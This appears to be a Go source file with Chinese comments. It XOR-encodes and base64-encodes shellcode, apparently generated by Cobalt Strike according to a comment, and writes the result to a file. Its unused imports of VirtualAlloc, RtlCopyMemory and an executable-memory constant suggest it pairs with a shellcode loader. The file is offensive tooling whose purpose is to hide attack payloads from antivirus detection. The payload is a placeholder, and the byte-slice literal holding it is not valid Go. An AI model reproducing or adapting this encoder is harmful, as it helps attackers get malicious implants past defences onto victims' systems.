package main

import (
	"encoding/base64"
	"fmt"
	"os"
	"syscall"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	KEY_1                  = 58 //输入数字
	KEY_2                  = 69 //输入数字
)

var (
	kernel32      = syscall.MustLoadDLL("kernel32.dll")
	ntdll         = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
)

func main() {
	var xor_shellcode []byte
	xor_shellcode = []byte{"shellcode"} //cs生成64位.java  shelcode
	var shellcode []byte
	for i := 0; i < len(xor_shellcode); i++ {
		shellcode = append(shellcode, xor_shellcode[i]^KEY_1^KEY_2)
	}
	decodeBytes := base64.StdEncoding.EncodeToString(shellcode)
	fname := os.Args[1]
	f, err := os.OpenFile(fname, os.O_CREATE|os.O_RDWR|os.O_APPEND, os.ModeAppend|os.ModePerm)
	if err != nil {
		fmt.Println(err)
	}
	f.WriteString(decodeBytes)
	f.Close()
	fmt.Println("写入成功!")
}
